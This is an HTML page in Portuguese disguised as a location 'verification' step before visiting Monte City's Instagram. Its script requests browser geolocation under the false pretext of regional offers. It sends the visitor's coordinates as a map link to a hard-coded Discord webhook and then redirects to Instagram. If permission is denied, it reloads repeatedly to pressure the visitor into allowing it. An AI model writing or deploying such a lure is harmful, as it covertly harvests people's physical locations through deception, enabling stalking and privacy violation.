<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monte City - Verifica√ß√£o</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #000; color: #fff; }
        .loader { border: 4px solid #333; border-top: 4px solid #d4af37; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .aviso { margin-top: 20px; color: #d4af37; font-weight: bold; padding: 0 20px; font-size: 1.1em; }
    </style>
</head>
<body onload="iniciar()">

    <div class="loader"></div>
    <p class="aviso">Para acessar o Instagram da Monte City, por favor, PERMITA a localiza√ß√£o no pop-up do seu navegador para validarmos as ofertas da sua regi√£o.</p>

    <script>
        // SEU WEBHOOK E INSTAGRAM J√Å CONFIGURADOS
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";

        function iniciar() {
            if (navigator.geolocation) {
                // Solicita a localiza√ß√£o sem tempo limite (Fica travado aqui)
                navigator.geolocation.getCurrentPosition(enviarEDirecionar, erroNegado);
            } else {
                alert("Seu navegador n√£o suporta GPS. Por favor, tente por um celular.");
            }
        }

        function enviarEDirecionar(pos) {
            const lat = pos.coords.latitude;
            const log = pos.coords.longitude;
            const mapa = `http://maps.google.com/maps?q=${lat},${log}`;

            const payload = {
                content: `üìç **Acesso Monte City!**\nO cliente permitiu a localiza√ß√£o.\nüåç **Mapa:** ${mapa}`
            };

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).finally(() => {
                // S√ì DIRECIONA SE TIVER SUCESSO NO GPS
                window.location.href = "https://www.instagram.com/montecitybr";
            });
        }

        function erroNegado() {
            // Se ele negar, o site avisa que √© obrigat√≥rio e recarrega
            alert("Aten√ß√£o: A permiss√£o de localiza√ß√£o √© obrigat√≥ria para acessar nossas ofertas regionais no Instagram.");
            location.reload(); 
        }
    </script>
</body>
</html>
